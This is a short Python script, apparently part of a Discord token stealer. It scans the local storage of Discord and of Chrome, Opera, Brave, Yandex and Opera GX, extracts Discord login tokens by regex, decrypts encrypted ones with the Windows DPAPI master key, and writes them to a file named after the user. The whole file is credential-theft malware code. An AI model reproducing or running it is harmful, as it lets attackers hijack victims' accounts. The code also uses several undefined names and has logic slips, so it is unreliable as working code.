import os

tokenPaths = {
    'Discord': f"{roaming}\\Discord",
    'Discord Canary': f"{roaming}\\discordcanary",
    'Discord PTB': f"{roaming}\\discordptb",
    'Google Chrome': f"{local}\\Google\\Chrome\\User Data\\Default",
    'Opera': f"{roaming}\\Opera Software\\Opera Stable",
    'Brave': f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    'Yandex': f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
    'OperaGX': f"{roaming}\\Opera Software\\Opera GX Stable"
}
fileInfo = "info_" + os.getlogin() + ".txt"


def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM,
                       buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        pass


def get_tokens(path):
    cleaned = []
    tokens = []
    done = []
    lev_db = f"{path}\\Local Storage\\leveldb\\"
    loc_state = f"{path}\\Local State"
    # new method with encryption
    if os.path.exists(loc_state):
        with open(loc_state, "r") as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
        for file in os.listdir(lev_db):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(lev_db + file, "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]

    else:  # old method without encryption
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            done.append(token)
            except:
                continue

    return done


def main_tokens():
    for platform, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        try:
            tokens = set(get_tokens(path))
        except:
            continue
        if not tokens:
            continue
        with open(fileInfo, "a") as f:
            for i in tokens:
                f.write(str(i) + "\n")
                print(i)


main_tokens()